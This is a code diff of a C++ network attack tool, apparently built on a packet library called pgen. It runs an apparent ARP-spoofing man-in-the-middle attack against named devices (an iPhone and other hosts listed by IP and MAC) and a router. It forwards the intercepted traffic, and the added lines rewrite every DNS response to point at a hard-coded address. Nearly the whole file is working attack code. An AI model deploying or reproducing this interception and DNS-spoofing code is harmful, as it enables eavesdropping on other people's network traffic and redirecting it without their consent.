@@ -6,156 +6,109 @@
 #include <sys/ioctl.h>
 #include <net/ethernet.h>
 #include <netpacket/packet.h>
-#define MAX_BUF 10000
 
 
 const char* dev = "wlan1";
 const char* myip = "192.168.179.8";
 
-/* buffalo router */
-//const char* router_ip = "192.168.222.1";
-//const char* router_mac = "74:03:bd:13:2c:a6";
+struct host{
+	char ip[32];
+	char mac[32];
+};
+
 
 /* nad11 mobile router */
-const char* router_ip = "192.168.179.1";
-const char* router_mac = "a2:12:42:17:d8:8f";
+struct host router = {"192.168.179.1", "a2:12:42:17:d8:8f"};
+
+/* buffalo router */
+//struct host router = {"192.168.222.1", "74:03:bd:13:2c:a6"};
+
+/* kaplan router */
+//struct host router = {"10.128.4.1", "00:00:0c:07:ac:01"};
 
 /* iphone */
-const char* target_ip = "192.168.179.4";
-const char* target_mac = "f0:24:75:bf:8d:bf";
+//struct host target = {"192.168.179.4", "f0:24:75:bf:8d:bf"};
 
 /* buffalo usb ethernetl */
-//const char* target_ip = "192.168.222.106";
-//const char* target_mac = "80:e6:50:17:18:46";
+//struct host target = {"192.168.222.103", "cc:e1:d5:02:ea:71"};
 
 /* mac wlan en0 */
-//const char* target_ip = "192.168.222.103";
-//const char* target_mac = "cc:e1:d5:02:ea:71";
+//struct host target = {"192.168.222.106", "10.128.5.85"};
+struct host target = {"192.168.179.5", "80:e6:50:17:18:46"};
 
 
 
-int sock;
-int initSocket(const char* dev);
+pgen_t* handle;
 void mitm_attack(const char* ip1, const char* mac1, 
 					const char* ip2, const char* mac2);
+bool other_packet_filter(const u_char* packet, int len);
 
 
-void toTarget(u_char* buf, int len){
-	macaddr mymac;
-	macaddr tmac(target_mac);
-	mymac.setmacbydev(dev);
-	struct MYETH* eth;
-	eth = (struct MYETH*)buf;
-	for(int i=0; i<6; i++){
-		eth->ether_shost[i] = mymac.getOctet(i);
-		eth->ether_dhost[i] = tmac.getOctet(i);
-	}
+
+
+bool myswitch(const u_char* packet, int len){
 	
-	int sendlen = write(sock, buf, len);
-	if(sendlen < 0){
-		printf("toTarget len: %d \n", len);
-	}
-}
+	// slankdev.net 
+	bit8 _s_data[] = {157, 7, 72, 229};
 
+	if(other_packet_filter(packet, len) == false) return true;
 
-
-void toRouter(u_char* buf, int len){
-	macaddr mymac;
-	macaddr rmac(router_mac);
-	mymac.setmacbydev(dev);
-	struct MYETH* eth;
-	eth = (struct MYETH*)buf;
-	for(int i=0; i<6; i++){
-		eth->ether_shost[i] = mymac.getOctet(i);
-		eth->ether_dhost[i] = rmac.getOctet(i);
-	}
+	macaddr next_src;
+	macaddr next_dst;
+	next_src.setmacbydev(dev);
+	pgen_ip ip(packet, len);
 	
-	int sendlen = write(sock, buf, len);
-	if(sendlen < 0){
-		printf("toRouter len: %d \n", len);
-	}
-}
+	if(ip.IP.dst == target.ip)	next_dst = target.mac;
+	else						next_dst = router.mac;
+	ip.ETH.src = next_src;
+	ip.ETH.dst = next_dst;
 
+	ip.compile();
+	pgen_unknown buf(ip.data, len);
 
-
-void analizeAndSend(u_char* buf, int len){
-	pgen_unknown pack(buf, len);
-	pack.summary();
-	
-	if(pack.IP.dst == target_ip){
-		toTarget(buf, len);	
-	}else{
-		toRouter(buf, len);
-	}
-}
-
-
-
-void myswitch(const char* dev, const char* myip, const char* target_ip, 
-		const char* target_mac,const char* router_ip, const char* router_mac){
-	u_char buf[MAX_BUF];
-	int len;
-	sock = initSocket(dev);
-
-	while(1){
-		len = read(sock, buf, MAX_BUF);
-		if(len < 0){
-			perror("read");
-			continue;
+	if(buf.isUDP){
+		if(buf.portis(53)){
+			pgen_dns dns(ip.data, len);
+			if(dns.DNS.flags.qr == 1){
+				memcpy(dns.DNS.answer[0].data, _s_data, 4);
+				dns.summary();
+				
+				dns.send_handle(handle);
+				return true;
+			}
 		}
-		analizeAndSend(buf, len);
 	}
+
+	ip.send_handle(handle);
+	return true;
 }
+
+
+
 
 
 int main(int argc, char** argv){
-	std::thread mitm(mitm_attack, target_ip, target_mac, router_ip, router_mac);
-	myswitch(dev, myip, target_ip, target_mac, router_ip, router_mac);		
+	handle = pgen_open(dev, NULL);
+	if(handle == NULL){
+		perror("pgen_open");
+		return -1;
+	}
+	std::thread mitm(mitm_attack, target.ip, target.mac, router.ip, router.mac);
+	sniff(handle, myswitch);
 }
 
 
-int initSocket(const char* dev){
-	int sock;
-	struct ifreq ifreq;
-	struct sockaddr_ll sa;
 
-	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-	if(sock < 0){
-		perror("initSocket::socket");
-		exit(-1);
-	}
+bool other_packet_filter(const u_char* packet, int len){
+	ipaddr myip;
+	myip.setipbydev(dev);
 
-	memset(&ifreq, 0, sizeof(struct ifreq));
-	strncpy(ifreq.ifr_name, dev, sizeof(ifreq.ifr_name)-1);
-	if(ioctl(sock,SIOCGIFINDEX,&ifreq)<0){
-		perror("initSocket::ioctl");
-		close(sock);
-		exit(-1);
-	}
-	sa.sll_family=PF_PACKET;
-	sa.sll_protocol=htons(ETH_P_ALL);
-	sa.sll_ifindex=ifreq.ifr_ifindex;
-	if(bind(sock,(struct sockaddr *)&sa,sizeof(sa))<0){
-		perror("initSocket::bind");
-		close(sock);
-		exit(-1);
-	}
+	pgen_unknown buf(packet, len);
+	if(buf.isIP == false)	return false;
+	if(buf.ipaddris(myip)) return false;
 
-	if(ioctl(sock,SIOCGIFFLAGS,&ifreq)<0){
-		perror("ioctl");
-		close(sock);
-		exit(-1);
-	}
-	ifreq.ifr_flags=ifreq.ifr_flags|IFF_PROMISC;
-	if(ioctl(sock,SIOCSIFFLAGS,&ifreq)<0){
-		perror("ioctl");
-		close(sock);
-		exit(-1);
-	}
-
-	return sock;
+	return true;	
 }
-
 
 
 
